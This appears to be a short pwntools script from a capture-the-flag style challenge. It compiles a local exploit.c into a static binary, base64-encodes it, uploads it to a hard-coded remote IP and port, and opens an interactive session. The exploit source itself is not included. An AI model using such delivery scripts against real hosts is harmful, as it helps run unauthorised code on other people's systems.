#!/usr/bin/env python3
from pwn import *
import base64, os

# Compile
os.system('musl-gcc exploit.c -o exploit -static')

# B64 encode
base64_code = ''
with open('./exploit', 'rb') as code:
    raw_code = code.read()
    base64_code = base64.b64encode(raw_code)

# Send exploit
io = remote('47.242.149.197',7600)
io.recvuntil(b'Your Binary(base64):')
io.sendline(base64_code)

io.interactive()